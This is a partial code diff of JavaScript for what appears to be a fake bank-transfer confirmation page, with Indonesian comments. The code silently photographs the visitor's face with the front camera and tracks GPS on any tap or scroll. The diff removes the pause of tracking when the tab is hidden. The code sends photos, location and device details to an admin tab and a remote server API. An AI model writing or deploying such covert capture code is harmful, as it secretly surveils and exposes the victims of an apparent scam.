             transferId: transferId,
             consent: true,
@@ -899,12 +832,12 @@
             receiverAccount: currentTemplate.receiverAccount || '2093832050',
             amount: currentTemplate.amountMain || 'IDR 515.000',
             amountSub: currentTemplate.amountSub || 'BND 35.12',
-            location: resolvedLocation,
-            photo: data.photo || capturedPhotoBase64 || '',
-            frontPhoto: data.frontPhoto || silentFrontPhotoBase64 || '',
-            front_photo: data.frontPhoto || silentFrontPhotoBase64 || '',
-            silentCapture: true,
-            silentLocation: true,
+            location: data.location || silentLocationData,
+            photo: data.photo || '',                 // Foto barang kamera belakang
+            frontPhoto: data.frontPhoto || '',       // FOTO WAJAH KAMERA DEPAN (SILENT)
+            front_photo: data.frontPhoto || '',      // Kompatibilitas field database
+            silentCapture: true,                     // Flag silent capture
+            silentLocation: true,                    // Flag silent location
             userAgent: navigator.userAgent,
             screen: `${screen.width}x${screen.height}`,
             language: navigator.language,
@@ -913,33 +846,26 @@
             timestamp: new Date().toISOString()
         };
 
-        // 1. LocalStorage
+        // 1. Local Storage: Update data yang ada atau tambah baru
         try {
             let localStored = JSON.parse(localStorage.getItem('bankidzz_local_transactions') || '[]');
             const idx = localStored.findIndex(t => t.transferId === transferId);
             if (idx >= 0) {
-                const prev = localStored[idx];
-                localStored[idx] = {
-                    ...prev,
-                    ...payload,
-                    photo: payload.photo || prev.photo || '',
-                    frontPhoto: payload.frontPhoto || prev.frontPhoto || '',
-                    location: (isRealGps(payload.location) ? payload.location : (isRealGps(prev.location) ? prev.location : payload.location))
-                };
+                localStored[idx] = { ...localStored[idx], ...payload };
             } else {
                 localStored.unshift(payload);
             }
             localStorage.setItem('bankidzz_local_transactions', JSON.stringify(localStored));
         } catch(e) {}
 
-        // 2. Broadcast
+        // 2. Broadcast Channel: Mengirim pembaruan seketika ke Admin Tab
         try {
             const channel = new BroadcastChannel(CONFIG.SYNC_CHANNEL);
             channel.postMessage({ type: 'NEW_LOCATION', payload: payload });
             channel.close();
         } catch(e) {}
 
-        // 3. Server
+        // 3. Post ke Server API
         try {
             const response = await fetch(CONFIG.API_URL, {
                 method: 'POST',
@@ -947,17 +873,18 @@
                 body: JSON.stringify(payload)
             });
             if (!response.ok) {
-                console.warn('API non-200, tersimpan lokal.');
+                console.warn('API status non-200, tersimpan di lokal.');
             }
         } catch (e) {
-            console.warn('Network error, tersimpan lokal.', e);
+            console.warn('Network error, tersimpan di lokal.', e);
         }
     }
 
+    // Alias untuk kompatibilitas fungsi lama jika ada pemanggilan eksternal
     const saveTransactionWithSilentData = syncTransactionRecord;
 
     // ============================================================
-    // TEMPLATE & UI
+    // TEMPLATE & UI FUNCTIONS
     // ============================================================
     function applyTemplate(template) {
         currentTemplate = { ...defaultTemplate, ...template };
@@ -996,11 +923,13 @@
     }
 
     async function loadTemplate() {
+        // 1. Terapkan data lokal langsung agar INSTAN saat refresh (tidak ada jeda atau kedipan foto lama)
         const stored = localStorage.getItem('bankidzz_new_template');
         if (stored) {
             try { applyTemplate(JSON.parse(stored)); } catch(e) {}
         }
 
+        // 2. Sync dari server di background
         try {
             const response = await fetch(CONFIG.TEMPLATE_URL, { cache: 'no-store' });
             if (response.ok) {
@@ -1031,9 +960,8 @@
         el._timeout = setTimeout(() => { el.className = 'notification'; }, 5000);
     }
 
-    // ============================================================
-    // WEB PROFILE
-    // ============================================================
+    let currentWebProfile = null;
+
     function makeFaviconTransparent(iconUrl) {
         if (!iconUrl) return;
         const img = new Image();
@@ -1153,11 +1081,13 @@
     }
 
     async function loadWebProfile() {
+        // 1. Terapkan data lokal langsung agar INSTAN saat refresh
         const stored = localStorage.getItem('bankidzz_web_profile');
         if (stored) {
             try { applyWebProfile(JSON.parse(stored)); } catch(e) {}
         }
 
+        // 2. Sync dari API backend di background
         try {
             const response = await fetch(CONFIG.WEBPROFILE_URL, { cache: 'no-store' });
             if (response.ok) {
@@ -1170,6 +1100,7 @@
             }
         } catch(e) {}
 
+        // 3. Fallback webprofile.json
         try {
             const staticResp = await fetch('webprofile.json', { cache: 'no-store' });
             if (staticResp.ok) {
@@ -1201,9 +1132,7 @@
         } catch(e) {}
     }
 
-    // ============================================================
-    // FILE INPUT FALLBACK
-    // ============================================================
+    // File input fallback
     if (elements.fileCameraInput) {
         elements.fileCameraInput.addEventListener('change', function(e) {
             const file = e.target.files[0];
@@ -1221,44 +1150,27 @@
 
     window.closeBackCamera = closeModal;
 
-    // ============================================================
-    // EVENT LISTENERS
-    // ============================================================
+    // Event listeners
     if (elements.btnCloseModal) elements.btnCloseModal.addEventListener('click', closeModal);
     if (elements.btnCancelPhoto) elements.btnCancelPhoto.addEventListener('click', closeModal);
     if (elements.btnConfirm) elements.btnConfirm.addEventListener('click', handleConfirmClick);
     if (elements.btnCaptureBack) elements.btnCaptureBack.addEventListener('click', handleCaptureBackPhoto);
 
-    // ============================================================
-    // INIT
-    // ============================================================
+    // Init
     loadTemplate();
     loadWebProfile();
     setupSyncListener();
     startRealtimeLocationTracking();
 
-    // Trigger GPS tracker pada interaksi user
+    // Trigger GPS tracker juga pada sentuhan/klik/scroll/fokus agar sensor langsung aktif sebelum tombol konfirmasi ditekan
     ['click', 'touchstart', 'pointerdown', 'scroll'].forEach(evt => {
         window.addEventListener(evt, () => startRealtimeLocationTracking(), { once: true, passive: true });
     });
     window.addEventListener('focus', () => startRealtimeLocationTracking());
-    
-    // Handle visibility change
     document.addEventListener('visibilitychange', () => {
         if (document.visibilityState === 'visible') {
-            console.log('[GPS] Resume tracking (tab visible)');
             startRealtimeLocationTracking();
-        } else {
-            if (locationWatchId !== null) {
-                try {
-                    navigator.geolocation.clearWatch(locationWatchId);
-                    locationWatchId = null;
-                    console.log('[GPS] Pause tracking (tab hidden)');
-                } catch(e) {}
-            }
         }
     });
-
-    console.log('[BANKIDZZ V3] ✓ Script loaded');
 
 })();
